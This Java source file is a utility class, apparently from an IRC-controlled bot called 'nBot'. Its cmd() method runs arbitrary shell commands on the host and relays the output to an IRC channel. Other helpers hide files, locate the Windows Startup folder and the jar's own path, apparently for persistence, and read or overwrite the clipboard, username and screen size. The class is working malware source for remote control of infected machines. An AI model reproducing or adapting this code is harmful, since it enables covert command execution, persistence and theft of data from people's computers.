
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Misc {

    public static String[] splitArgs(String command) {
        try {
            command = command.trim();
            ArrayList argsList = new ArrayList(15);
            int quotes = 0;
            int lastIndex = 0;
            for (int i = 0; i < command.length(); i++) {
                if (command.substring(i, i + 1).equals("\"")) {
                    quotes++;
                    if (i + 1 == command.length()) {
                        argsList.add(command.substring(lastIndex + 1, i + 1));
                    }
                } else if (command.substring(i, i + 1).equals(" ")) {
                    if (quotes == 0) {
                        int offset = lastIndex == 0 ? 0 : 1;
                        argsList.add(command.substring(lastIndex + offset, i));
                        lastIndex = i;
                    } else if (quotes % 2 == 0) {
                        argsList.add(command.substring(lastIndex + 1, i));
                        lastIndex = i;
                    }
                } else if (i + 1 == command.length()) {
                    int offset = lastIndex == 0 ? 0 : 1;
                    argsList.add(command.substring(lastIndex + offset, i + 1));
                }
            }

            argsList.trimToSize();
            Object objs[] = argsList.toArray();
            String args[] = new String[objs.length];
            for (int j = 0; j < objs.length; j++) {
                args[j] = (String) objs[j];
                args[j] = args[j].replaceAll("\"", "");
            }

            return args;
        } catch (Exception e) {
            e.printStackTrace();
            return new String[]{"", "", ""};
        }
    }

    public static String size(long bytes) {
        if(bytes <= 1024) {
            return bytes+" bytes";
        } else if(bytes > 1024 && bytes < 1048576) {
            return (bytes/1024)+" kb";
        } else if(bytes >= 1048576) {
            return (bytes/1024)/1024 +" mb";
        }
        return null;
    }

    public static void hideFile(String file) {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", "attrib", "+h", file});
        } catch (IOException ex) {
            Logger.getLogger(Misc.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public static List listTasks() throws IOException {
        ArrayList<String> taskList = new ArrayList<String>();
        Runtime runtime = Runtime.getRuntime();
        String cmds[] = {"cmd", "/c", "tasklist"};
        Process proc = runtime.exec(cmds);
        InputStream inputstream = proc.getInputStream();
        InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
        BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
        String line;
        int lineNum = 0;
        while ((line = bufferedreader.readLine()) != null) {
            lineNum++;
            if(lineNum <= 3) {
                continue;
            }
            try {
                String task = line.substring(0, line.indexOf(".exe")+4);
                taskList.add(task);
            } catch (Exception e) {
                e.printStackTrace();
                continue;
            }
        }
        return null;
    }

    public static boolean deleteDirectory(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            for (int i = 0; i < files.length; i++) {
                if (files[i].isDirectory()) {
                    deleteDirectory(files[i]);
                } else {
                    files[i].delete();
                }
            }
        }
        return (path.delete());
    }

    public static void cmd(String cmd) throws IOException {
        Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", cmd});
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Command sent to CMD, " + cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            if (line.equals("\n") || line.equals("") || line.equals(" ")) {
                continue;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Cmd Output: " + line);
        }
        br.close();
    }

    public static void copy(String fromFileName, String toFileName)
            throws IOException {
        File fromFile = new File(fromFileName);
        File toFile = new File(toFileName);

        if (!fromFile.exists()) {
            throw new IOException("FileCopy: " + "no such source file: " + fromFileName);
        }
        if (!fromFile.isFile()) {
            throw new IOException("FileCopy: " + "can't copy directory: " + fromFileName);
        }
        if (!fromFile.canRead()) {
            throw new IOException("FileCopy: " + "source file is unreadable: " + fromFileName);
        }

        if (toFile.isDirectory()) {
            toFile = new File(toFile, fromFile.getName());
        }

        if (toFile.exists()) {
            if (!toFile.canWrite()) {
                throw new IOException("FileCopy: " + "destination file is unwriteable: " + toFileName);
            }
            System.out.print("Overwrite existing file " + toFile.getName() + "? (Y/N): ");
            System.out.flush();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    System.in));
            String response = in.readLine();
            if (!response.equals("Y") && !response.equals("y")) {
                throw new IOException("FileCopy: " + "existing file was not overwritten.");
            }
        } else {
            String parent = toFile.getParent();
            if (parent == null) {
                parent = System.getProperty("user.dir");
            }
            File dir = new File(parent);
            if (!dir.exists()) {
                throw new IOException("FileCopy: " + "destination directory doesn't exist: " + parent);
            }
            if (dir.isFile()) {
                throw new IOException("FileCopy: " + "destination is not a directory: " + parent);
            }
            if (!dir.canWrite()) {
                throw new IOException("FileCopy: " + "destination directory is unwriteable: " + parent);
            }
        }

        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(fromFile);
            to = new FileOutputStream(toFile);
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = from.read(buffer)) != -1) {
                to.write(buffer, 0, bytesRead); // write
            }
        } finally {
            if (from != null) {
                try {
                    from.close();
                } catch (IOException e) {
                }
            }
            if (to != null) {
                try {
                    to.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static String getIPAddress(String url) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader((new URL(url)).openStream()));
            return reader.readLine();
        } catch (IOException ioe) {
            return (new StringBuilder("IOException thrown: ")).append(ioe.toString()).toString();
        }
    }

    public static String findStartup() {
        if (System.getProperty("os.name").contains("xp")) {
            return (new StringBuilder(String.valueOf(System.getProperty("user.home")))).append("\\Start Menu\\Programs\\Startup\\").toString();
        } else {
            return (new StringBuilder(String.valueOf(System.getProperty("user.home")))).append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\").toString();
        }
    }

    public static String getJARLoc() {
        try {
            String str = Class.forName("Main").getResource("Main.class").toURI().toString();
            str = str.substring(0, str.lastIndexOf("!"));
            str = str.replaceAll("jar:file:/", "");
            File file = new File(new URI((new StringBuilder("file:/")).append(str).toString()));
            return file.getPath();
        } catch (Exception e) {
            return findStartup();
        }
    }

    public static String getClipboard() {
        Transferable t = Toolkit.getDefaultToolkit().getSystemClipboard().getContents(null);
        try {
            if (t != null && t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                String text = (String) t.getTransferData(DataFlavor.stringFlavor);
                return text;
            }
        } catch (UnsupportedFlavorException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void setClipboard(String str) {
        StringSelection ss = new StringSelection(str);
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(ss, null);
    }

    public static String screenSize() {
        int height = Toolkit.getDefaultToolkit().getScreenSize().height;
        int width = Toolkit.getDefaultToolkit().getScreenSize().width;
        return width + " x " + height;
    }

    /**
     * Gets the username of a client
     * @return
     */
    public static String getUsername() {
        String home = System.getProperty("user.home");
        if (home.endsWith("\\")) {
            home = home.substring(0, home.length() - 1);
        }
        return home.substring(home.lastIndexOf("\\") + 1);
    }
}
